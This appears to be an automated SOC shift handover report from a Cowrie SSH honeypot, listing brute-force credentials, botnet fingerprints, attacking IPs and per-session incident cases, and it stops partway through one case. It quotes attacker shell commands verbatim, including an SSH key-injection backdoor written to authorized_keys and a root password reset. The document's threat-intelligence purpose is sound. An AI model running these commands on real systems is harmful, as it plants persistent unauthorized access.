# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-07 |
| **Generated At** | 2026-06-07T15:41:03Z |
| **Shift Time** | 15:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **258** |
| Confirmed Threats | **231** |
| False Positives Filtered | **27** (10.5%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **13** |
| High Severity Cases | **59** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **199** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **160** |
| Unique Credential Pairs | **106** |
| Unique Usernames | **74** |
| Unique Passwords | **88** |
| Successful Auth Pairs | **39** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 59 |
| `345gs5662d34` | 27 |
| `test` | 2 |
| `ftpuser` | 2 |
| `frappe` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 29 |
| `345gs5662d34` | 27 |
| `123456` | 15 |
| `123` | 3 |
| `12345` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 29 |
| `345gs5662d34` | `345gs5662d34` | 27 |
| `frappe` | `frappe24` | 1 |
| `spawner` | `spawner` | 1 |
| `psg` | `psg` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root2025` | `210.90.155.178` | 2026-06-07T14:03:44 |
| `root` | `3245gs5662d34` | `210.90.155.178` | 2026-06-07T14:03:47 |
| `root` | `5566` | `190.167.237.191` | 2026-06-07T14:04:55 |
| `root` | `3245gs5662d34` | `190.167.237.191` | 2026-06-07T14:05:01 |
| `root` | `ipecscm` | `190.167.237.191` | 2026-06-07T14:06:46 |
| `root` | `Admin@123!@#` | `20.244.18.126` | 2026-06-07T14:08:26 |
| `root` | `3245gs5662d34` | `20.244.18.126` | 2026-06-07T14:08:28 |
| `root` | `123abc` | `20.244.18.126` | 2026-06-07T14:10:33 |
| `root` | `yz.123456` | `103.167.89.222` | 2026-06-07T14:11:20 |
| `root` | `3245gs5662d34` | `103.167.89.222` | 2026-06-07T14:11:23 |
| `root` | `s` | `20.244.18.126` | 2026-06-07T14:13:10 |
| `root` | `55555555` | `190.167.237.191` | 2026-06-07T14:19:23 |
| `root` | `dongdong` | `20.244.18.126` | 2026-06-07T14:19:36 |
| `root` | `Root@123` | `217.154.180.67` | 2026-06-07T14:21:33 |
| `root` | `3245gs5662d34` | `217.154.180.67` | 2026-06-07T14:21:40 |
| `root` | `qpwo1029` | `190.167.237.191` | 2026-06-07T14:23:09 |
| `root` | `Qazwsx12` | `190.167.237.191` | 2026-06-07T14:24:59 |
| `root` | `root@123.` | `20.244.18.126` | 2026-06-07T14:26:05 |
| `root` | `ss123456` | `190.167.237.191` | 2026-06-07T14:26:54 |
| `root` | `Paris2025` | `217.154.180.67` | 2026-06-07T14:28:54 |
| `root` | `secret123` | `20.244.18.126` | 2026-06-07T14:32:25 |
| `root` | `12qw12qw` | `217.154.180.67` | 2026-06-07T14:36:05 |
| `root` | `joshua` | `217.154.180.67` | 2026-06-07T14:57:57 |
| `root` | `a;sldkfj` | `14.103.233.27` | 2026-06-07T15:14:09 |
| `root` | `3245gs5662d34` | `14.103.233.27` | 2026-06-07T15:14:17 |
| `root` | `ly123456!` | `51.68.226.87` | 2026-06-07T15:15:45 |
| `root` | `3245gs5662d34` | `51.68.226.87` | 2026-06-07T15:15:49 |
| `root` | `a112233.` | `20.12.41.6` | 2026-06-07T15:16:37 |
| `root` | `3245gs5662d34` | `20.12.41.6` | 2026-06-07T15:16:42 |
| `root` | `zhang123.` | `92.205.57.72` | 2026-06-07T15:16:52 |
| `root` | `3245gs5662d34` | `92.205.57.72` | 2026-06-07T15:16:55 |
| `root` | `777777` | `20.12.41.6` | 2026-06-07T15:18:39 |
| `root` | `Server1` | `20.12.41.6` | 2026-06-07T15:20:40 |
| `root` | `1qaz@Wsx` | `14.103.233.27` | 2026-06-07T15:22:00 |
| `root` | `Server1234!` | `20.12.41.6` | 2026-06-07T15:26:36 |
| `root` | `toor1234` | `20.12.41.6` | 2026-06-07T15:28:28 |
| `root` | `asdqwe123!@#` | `20.12.41.6` | 2026-06-07T15:33:39 |
| `root` | `12348765` | `20.12.41.6` | 2026-06-07T15:35:38 |
| `root` | `qwe123@@` | `14.103.233.27` | 2026-06-07T15:36:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **258** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 161 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 151 | 11 |
| `03a80b21afa8...` | Modern SSH client | 10 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 151 | 11 | Mirai/variant |
| `03a80b21afa8...` | libssh | 10 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 29 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:KwZ6YG1Uyd6d"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `217.154.180.67`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.167.89.222`, `20.12.41.6`, `14.103.233.27`, `92.205.57.72`, `51.68.226.87`, `210.90.155.178`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **16** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS8560` | IONOS SE | 1 | HIGH |
| `AS6400` | Compañía Dominicana de Teléfonos S. A. | 1 | HIGH |
| `AS151858` | INTERDIGI JOINT STOCK COMPANY | 1 | HIGH |
| `AS21499` | Host Europe GmbH | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (59)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4014722be128

| Field | Detail |
|---|---|
| **Source IP** | `210.90.155[.]178` |
| **First Seen** | 2026-06-07 14:03 |
| **Last Seen** | 2026-06-07 14:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:03:43` | `cowrie.session.connect` |
| `2026-06-07 14:03:43` | `cowrie.client.version` |
| `2026-06-07 14:03:43` | `cowrie.client.kex` |
| `2026-06-07 14:03:44` | `cowrie.login.success` |
| `2026-06-07 14:03:44` | `cowrie.session.params` |
| `2026-06-07 14:03:44` | `cowrie.command.input` |
| `2026-06-07 14:03:44` | `cowrie.command.failed` |
| `2026-06-07 14:03:44` | `cowrie.log.closed` |
| `2026-06-07 14:03:45` | `cowrie.session.params` |
| `2026-06-07 14:03:45` | `cowrie.command.input` |
| `2026-06-07 14:03:45` | `cowrie.session.file_download` |
| `2026-06-07 14:03:45` | `cowrie.log.closed` |
| `2026-06-07 14:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.90.155[.]178` to AbuseIPDB if not already reported
- [ ] Block `210.90.155[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47d8be6dde1b

| Field | Detail |
|---|---|
| **Source IP** | `210.90.155[.]178` |
| **First Seen** | 2026-06-07 14:03 |
| **Last Seen** | 2026-06-07 14:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:03:47` | `cowrie.session.connect` |
| `2026-06-07 14:03:47` | `cowrie.client.version` |
| `2026-06-07 14:03:47` | `cowrie.client.kex` |
| `2026-06-07 14:03:47` | `cowrie.login.success` |
| `2026-06-07 14:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.90.155[.]178` to AbuseIPDB if not already reported
- [ ] Block `210.90.155[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727ce25948c3

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:04 |
| **Last Seen** | 2026-06-07 14:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:04:54` | `cowrie.session.connect` |
| `2026-06-07 14:04:54` | `cowrie.client.version` |
| `2026-06-07 14:04:54` | `cowrie.client.kex` |
| `2026-06-07 14:04:55` | `cowrie.login.success` |
| `2026-06-07 14:04:56` | `cowrie.session.params` |
| `2026-06-07 14:04:56` | `cowrie.command.input` |
| `2026-06-07 14:04:56` | `cowrie.command.failed` |
| `2026-06-07 14:04:56` | `cowrie.log.closed` |
| `2026-06-07 14:04:57` | `cowrie.session.params` |
| `2026-06-07 14:04:57` | `cowrie.command.input` |
| `2026-06-07 14:04:57` | `cowrie.session.file_download` |
| `2026-06-07 14:04:57` | `cowrie.log.closed` |
| `2026-06-07 14:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd5f28b84b09

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:05 |
| **Last Seen** | 2026-06-07 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:05:00` | `cowrie.session.connect` |
| `2026-06-07 14:05:00` | `cowrie.client.version` |
| `2026-06-07 14:05:00` | `cowrie.client.kex` |
| `2026-06-07 14:05:01` | `cowrie.login.success` |
| `2026-06-07 14:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5888cc21b1ed

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:06 |
| **Last Seen** | 2026-06-07 14:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:06:44` | `cowrie.session.connect` |
| `2026-06-07 14:06:44` | `cowrie.client.version` |
| `2026-06-07 14:06:45` | `cowrie.client.kex` |
| `2026-06-07 14:06:46` | `cowrie.login.success` |
| `2026-06-07 14:06:46` | `cowrie.session.params` |
| `2026-06-07 14:06:46` | `cowrie.command.input` |
| `2026-06-07 14:06:46` | `cowrie.command.failed` |
| `2026-06-07 14:06:47` | `cowrie.log.closed` |
| `2026-06-07 14:06:47` | `cowrie.session.params` |
| `2026-06-07 14:06:47` | `cowrie.command.input` |
| `2026-06-07 14:06:47` | `cowrie.session.file_download` |
| `2026-06-07 14:06:47` | `cowrie.log.closed` |
| `2026-06-07 14:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6937b86a3bb

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-07 14:06 |
| **Last Seen** | 2026-06-07 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:06:50` | `cowrie.session.connect` |
| `2026-06-07 14:06:50` | `cowrie.client.version` |
| `2026-06-07 14:06:51` | `cowrie.client.kex` |
| `2026-06-07 14:06:52` | `cowrie.login.success` |
| `2026-06-07 14:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f2b6262b05b

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:08 |
| **Last Seen** | 2026-06-07 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:08:26` | `cowrie.session.connect` |
| `2026-06-07 14:08:26` | `cowrie.client.version` |
| `2026-06-07 14:08:26` | `cowrie.client.kex` |
| `2026-06-07 14:08:26` | `cowrie.login.success` |
| `2026-06-07 14:08:27` | `cowrie.session.params` |
| `2026-06-07 14:08:27` | `cowrie.command.input` |
| `2026-06-07 14:08:27` | `cowrie.command.failed` |
| `2026-06-07 14:08:27` | `cowrie.log.closed` |
| `2026-06-07 14:08:27` | `cowrie.session.params` |
| `2026-06-07 14:08:27` | `cowrie.command.input` |
| `2026-06-07 14:08:27` | `cowrie.session.file_download` |
| `2026-06-07 14:08:27` | `cowrie.log.closed` |
| `2026-06-07 14:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f2dbb532803

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:08 |
| **Last Seen** | 2026-06-07 14:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:08:28` | `cowrie.session.connect` |
| `2026-06-07 14:08:28` | `cowrie.client.version` |
| `2026-06-07 14:08:28` | `cowrie.client.kex` |
| `2026-06-07 14:08:28` | `cowrie.login.success` |
| `2026-06-07 14:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e9dec100b30

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:10 |
| **Last Seen** | 2026-06-07 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:10:33` | `cowrie.session.connect` |
| `2026-06-07 14:10:33` | `cowrie.client.version` |
| `2026-06-07 14:10:33` | `cowrie.client.kex` |
| `2026-06-07 14:10:33` | `cowrie.login.success` |
| `2026-06-07 14:10:34` | `cowrie.session.params` |
| `2026-06-07 14:10:34` | `cowrie.command.input` |
| `2026-06-07 14:10:34` | `cowrie.command.failed` |
| `2026-06-07 14:10:34` | `cowrie.log.closed` |
| `2026-06-07 14:10:34` | `cowrie.session.params` |
| `2026-06-07 14:10:34` | `cowrie.command.input` |
| `2026-06-07 14:10:34` | `cowrie.session.file_download` |
| `2026-06-07 14:10:34` | `cowrie.log.closed` |
| `2026-06-07 14:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af0e808d5cb5

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:10 |
| **Last Seen** | 2026-06-07 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:10:35` | `cowrie.session.connect` |
| `2026-06-07 14:10:35` | `cowrie.client.version` |
| `2026-06-07 14:10:35` | `cowrie.client.kex` |
| `2026-06-07 14:10:35` | `cowrie.login.success` |
| `2026-06-07 14:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afde7d855d74

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 14:11 |
| **Last Seen** | 2026-06-07 14:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:11:20` | `cowrie.session.connect` |
| `2026-06-07 14:11:20` | `cowrie.client.version` |
| `2026-06-07 14:11:20` | `cowrie.client.kex` |
| `2026-06-07 14:11:20` | `cowrie.login.success` |
| `2026-06-07 14:11:21` | `cowrie.session.params` |
| `2026-06-07 14:11:21` | `cowrie.command.input` |
| `2026-06-07 14:11:21` | `cowrie.command.failed` |
| `2026-06-07 14:11:21` | `cowrie.log.closed` |
| `2026-06-07 14:11:21` | `cowrie.session.params` |
| `2026-06-07 14:11:21` | `cowrie.command.input` |
| `2026-06-07 14:11:21` | `cowrie.session.file_download` |
| `2026-06-07 14:11:21` | `cowrie.log.closed` |
| `2026-06-07 14:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e9e6c1472d3

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 14:11 |
